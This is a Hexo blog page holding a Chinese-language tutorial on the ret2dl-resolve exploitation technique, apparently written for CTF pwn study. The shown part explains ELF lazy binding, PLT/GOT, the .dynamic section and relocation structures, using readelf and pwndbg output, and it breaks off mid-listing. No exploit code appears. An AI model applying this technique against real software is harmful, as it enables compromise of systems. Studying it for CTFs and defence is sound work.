<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"right","width":500,"display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"万一找到了呢","hits_empty":"你说的 ${query} 我怎么找不着呢 ","hits_stats":"找到了 ${hits} 个结果，用时 ${time} 毫秒"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="dustland">
<meta property="og:type" content="website">
<meta property="og:title" content="dustland">
<meta property="og:url" content="http://deutschball.github.io/impossible/page/3/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="dustland">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="dustball">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/impossible/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/ret2dl-resolve/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/ret2dl-resolve/" class="post-title-link" itemprop="url">ret2dl-resolve</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-10-17 23:19:00" itemprop="dateCreated datePublished" datetime="2024-10-17T23:19:00+08:00">2024-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-23 21:32:09" itemprop="dateModified" datetime="2024-11-23T21:32:09+08:00">2024-11-23</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl-resolve"></a>ret2dl-resolve</h1><p>在学习这部分之前，最好有带调试符号的libc和ld,</p>
<p>也就是说自己编译一个待调试符号的glibc</p>
<p>然后编译链接程序时指定使用我们的glibc,不用系统自带那个</p>
<p>或者用patchelf把程序链接的glibc调包</p>
<p>然而调试版和发行版调用的函数好像不太一样</p>
<h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>假设有程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello, world!\n&quot;</span>, <span class="number">14</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -O0 -g -no-pie -m32 -o test</span><br></pre></td></tr></table></figure>

<p>write函数位于libc.so中，main程序是如何与write符号链接的呢？</p>
<p>这个过程叫做延迟绑定，又叫做懒加载，意思是我们的程序第一次调用动态库中的符号时，动态连接器ld才会解析write函数</p>
<p>这个解析过程如下</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A1.png" alt="第一次解析"></p>
<p>经过第一次解析,write@got被填充了正确的write地址,此后的write调用将如图所示</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A2.png" alt="此后的调用"></p>
<p>这里面提到了两个表，PLT表，GOT表</p>
<p>如果gdb加了pwndbg插件，可以使用plt和got命令观察两者</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; elfheader</span><br><span class="line">0x8048194 - 0x80481b4  .interp</span><br><span class="line">0x80481b4 - 0x80481d8  .note.gnu.build-id</span><br><span class="line">0x80481d8 - 0x80481f8  .note.ABI-tag</span><br><span class="line">0x80481f8 - 0x8048218  .gnu.hash</span><br><span class="line">0x8048218 - 0x8048268  .dynsym</span><br><span class="line">0x8048268 - 0x80482d1  .dynstr</span><br><span class="line">0x80482d2 - 0x80482dc  .gnu.version</span><br><span class="line">0x80482dc - 0x804830c  .gnu.version_r</span><br><span class="line">0x804830c - 0x8048314  .rel.dyn</span><br><span class="line">0x8048314 - 0x8048324  .rel.plt</span><br><span class="line">0x8049000 - 0x8049020  .init</span><br><span class="line">0x8049020 - 0x8049050  .plt</span><br><span class="line">0x8049050 - 0x80491a6  .text</span><br><span class="line">0x80491a8 - 0x80491bc  .fini</span><br><span class="line">0x804a000 - 0x804a013  .rodata</span><br><span class="line">0x804a014 - 0x804a048  .eh_frame_hdr</span><br><span class="line">0x804a048 - 0x804a110  .eh_frame</span><br><span class="line">0x804bef8 - 0x804befc  .init_array</span><br><span class="line">0x804befc - 0x804bf00  .fini_array</span><br><span class="line">0x804bf00 - 0x804bff0  .dynamic</span><br><span class="line">0x804bff0 - 0x804bff4  .got</span><br><span class="line">0x804bff4 - 0x804c008  .got.plt</span><br><span class="line">0x804c008 - 0x804c010  .data</span><br><span class="line">0x804c010 - 0x804c014  .bss</span><br><span class="line"></span><br><span class="line">pwndbg&gt; plt</span><br><span class="line">0x8049030: __libc_start_main@plt</span><br><span class="line">0x8049040: <span class="built_in">printf</span>@plt</span><br><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">GOT protection: Partial RELRO | GOT <span class="built_in">functions</span>: 2</span><br><span class="line"></span><br><span class="line">[0x804c000] __libc_start_main@GLIBC_2.34 -&gt; 0xf7cf8cf0 (__libc_start_main_impl) ◂— push   ebp</span><br><span class="line">[0x804c004] <span class="built_in">printf</span>@GLIBC_2.0 -&gt; 0x8049046 (<span class="built_in">printf</span>@plt+6) ◂— push   8</span><br></pre></td></tr></table></figure>



<h3 id="PLT的作用"><a href="#PLT的作用" class="headerlink" title="PLT的作用"></a>PLT的作用</h3><p>对每一个glibc中的函数func,都会有一个plt表项</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp * func@got</span><br><span class="line">push index</span><br><span class="line">jmp * _dl_runtime_resolve@got</span><br></pre></td></tr></table></figure>

<p>如果got中填写了正确的函数地址,则会直接调用该函数</p>
<p>如果got中填写了push index的地址,则调用_dl_runtime_resolve解析符号</p>
<p>解析符号的依据就是这个index,导入函数下标</p>
<p>.plt(procedure Linkage Table，过程链接表)</p>
<p>.plt.got专门用于存放<code>__cxa_finalize</code>函数的plt条目</p>
<h3 id="GOT的作用"><a href="#GOT的作用" class="headerlink" title="GOT的作用"></a>GOT的作用</h3><p>存放函数地址</p>
<p>如果尚未解析则存放对应函数plt中的下一条指令地址</p>
<p>GOT表分成两部分</p>
<p>.got和.got.plt</p>
<p>.got(Global Offset Table),全局变量地址表</p>
<p>.got.plt是全局函数地址表</p>
<p>前面我们所说的write@got实际上是<a href="mailto:&#119;&#x72;&#x69;&#116;&#101;&#x40;&#x67;&#x6f;&#x74;&#46;&#x70;&#108;&#x74;">&#119;&#x72;&#x69;&#116;&#101;&#x40;&#x67;&#x6f;&#x74;&#46;&#x70;&#108;&#x74;</a></p>
<p>.got表纯纯存放全局变量地址,有一个算一个,没有特别之处</p>
<p>.got.plt的前三个表项存放了特殊地址,其后的表项就是全局函数地址了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A000 14 9F 04 08                   _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC</span><br><span class="line">.got.plt:0804A000                                                                       ; DATA XREF: _init_proc+9↑o</span><br><span class="line">.got.plt:0804A000                                                                       ; _start+10↑o ...</span><br><span class="line">.got.plt:0804A004 00 00 00 00                   dword_804A004   dd 0                    ; DATA XREF: sub_80482D0↑r</span><br><span class="line">.got.plt:0804A008 00 00 00 00                   dword_804A008   dd 0                    ; DATA XREF: sub_80482D0+6↑r</span><br><span class="line">.got.plt:0804A00C 24 A0 04 08                   off_804A00C     dd offset __libc_start_main</span><br><span class="line">.got.plt:0804A00C                                                                       ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0804A010 28 A0 04 08                   off_804A010     dd offset write         ; DATA XREF: _write↑r</span><br><span class="line">.got.plt:0804A010                               _got_plt        ends</span><br></pre></td></tr></table></figure>

<h4 id="GOT-PLT-0-dynamic"><a href="#GOT-PLT-0-dynamic" class="headerlink" title=".GOT.PLT[0]&#x3D;.dynamic"></a>.GOT.PLT[0]&#x3D;.dynamic</h4><p>.GOT.PLT[0]存放.dynamic节的地址,在节头表中可以查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/6.1.3_pwn_xdctf2015_pwn200# readelf -S test</span><br><span class="line">There are 35 section headers, starting at offset 0x1fbc:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">	...</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">	...</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  p (processor specific)</span><br></pre></td></tr></table></figure>

<p>.dynamic节在0x08049f14,因此GOT[0]&#x3D;0x08049f14</p>
<p>这个节的作用是什么呢?</p>
<p>可以用readelf -d查看节内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># readelf -d test</span></span><br><span class="line"></span><br><span class="line">Dynamic section at offset <span class="number">0xf14</span> contains <span class="number">24</span> entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> <span class="number">0x00000001</span> (NEEDED)                     Shared library: [libc.so<span class="number">.6</span>]</span><br><span class="line"> <span class="number">0x0000000c</span> (INIT)                       <span class="number">0x80482ac</span></span><br><span class="line"> <span class="number">0x0000000d</span> (FINI)                       <span class="number">0x80484d4</span></span><br><span class="line"> <span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x8049f0c</span></span><br><span class="line"> <span class="number">0x0000001b</span> (INIT_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x0000001a</span> (FINI_ARRAY)                 <span class="number">0x8049f10</span></span><br><span class="line"> <span class="number">0x0000001c</span> (FINI_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffef5</span> (GNU_HASH)                   <span class="number">0x80481ac</span></span><br><span class="line"> <span class="number">0x00000005</span> (STRTAB)                     <span class="number">0x804821c</span></span><br><span class="line"> <span class="number">0x00000006</span> (SYMTAB)                     <span class="number">0x80481cc</span></span><br><span class="line"> <span class="number">0x0000000a</span> (STRSZ)                      <span class="number">75</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000b</span> (SYMENT)                     <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000015</span> (DEBUG)                      <span class="number">0x0</span></span><br><span class="line"> <span class="number">0x00000003</span> (PLTGOT)                     <span class="number">0x804a000</span></span><br><span class="line"> <span class="number">0x00000002</span> (PLTRELSZ)                   <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000014</span> (PLTREL)                     REL</span><br><span class="line"> <span class="number">0x00000017</span> (JMPREL)                     <span class="number">0x804829c</span></span><br><span class="line"> <span class="number">0x00000011</span> (REL)                        <span class="number">0x8048294</span></span><br><span class="line"> <span class="number">0x00000012</span> (RELSZ)                      <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x00000013</span> (RELENT)                     <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffffe</span> (VERNEED)                    <span class="number">0x8048274</span></span><br><span class="line"> <span class="number">0x6fffffff</span> (VERNEEDNUM)                 <span class="number">1</span></span><br><span class="line"> <span class="number">0x6ffffff0</span> (VERSYM)                     <span class="number">0x8048268</span></span><br><span class="line"> <span class="number">0x00000000</span> (<span class="literal">NULL</span>)                       <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<p>每一项都是一个<code>Elf32_Dyn</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>

<p>这是一个键值对,键是d_tag,值要么是d_val要么是d_ptr</p>
<p>d_tag是一些枚举值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NULL    0   <span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NEEDED  1   <span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTRELSZ 2  <span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTGOT  3   <span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HASH    4   <span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRTAB  5   <span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB  6   <span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELA    7   <span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELASZ  8   <span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRSZ   10  <span class="comment">/* Size in bytes of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMENT  11  <span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT    12  <span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI    13  <span class="comment">/* Address of termination function */</span></span></span><br></pre></td></tr></table></figure>



<p>这个节指示了很多信息,比如init函数和init_array的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000c</span> (INIT)                       <span class="number">0x80482ac</span></span><br><span class="line"><span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x8049f0c</span></span><br></pre></td></tr></table></figure>

<p>比如符号表和字符串表地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00000005 (STRTAB)                     0x804821c</span><br><span class="line">0x00000006 (SYMTAB)                     0x80481cc</span><br></pre></td></tr></table></figure>

<p>比如重定位信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00000011</span> (REL)                        <span class="number">0x8048294</span></span><br></pre></td></tr></table></figure>



<p>这个表有何作用呢?</p>
<p>一是指导动态链接器进行</p>
<p>​	加载so</p>
<p>​	解析符号</p>
<p>​	重定位</p>
<p>​	调用初始化函数</p>
<p>二是运行时</p>
<p>​	延迟绑定</p>
<p>​	处理dlopen显示加载的函数</p>
<blockquote>
<p>关于重定位</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/6.1.3_pwn_xdctf2015_pwn200# readelf -r <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.dyn&#x27;</span> at offset 0x294 contains 1 entry:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ffc  00000106 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.plt&#x27;</span> at offset 0x29c contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804a00c  00000207 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a010  00000307 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>

<p>每一个重定位表项都对应一个<code>Elf32_Rel</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;       <span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;         <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>

<p>r_offset是符号got表项的虚拟地址</p>
<p>r_info是符号的重定位类型和符号下标</p>
<p>​	重定位类型最常见全局变量的R_386_GLOB_DAT和全局函数的R_386_JUMP_SLOT</p>
<p>​	符号下标索引.dynsym节</p>
<p>比如<code>write</code>的索引是3,</p>
<p><code>libc_start_main</code>的索引是2</p>
<p><code>__gmon_start__</code>的索引是1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># readelf -s test</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.dynsym&#x27;</span> contains <span class="number">5</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     <span class="number">1</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     <span class="number">2</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2<span class="number">.0</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">3</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND write@GLIBC_2<span class="number">.0</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">4</span>: <span class="number">080484</span>ec     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">16</span> _IO_stdin_used</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">70</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">		...</span><br><span class="line">    <span class="number">32</span>: <span class="number">00000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    <span class="number">33</span>: <span class="number">08048370</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> deregister_tm_clones</span><br><span class="line">    <span class="number">34</span>: <span class="number">080483b</span>0     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> register_tm_clones</span><br><span class="line">    <span class="number">35</span>: <span class="number">080483f</span>0     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> __do_global_dtors_aux</span><br><span class="line">    <span class="number">36</span>: <span class="number">0804</span>a01c     <span class="number">1</span> OBJECT  LOCAL  DEFAULT   <span 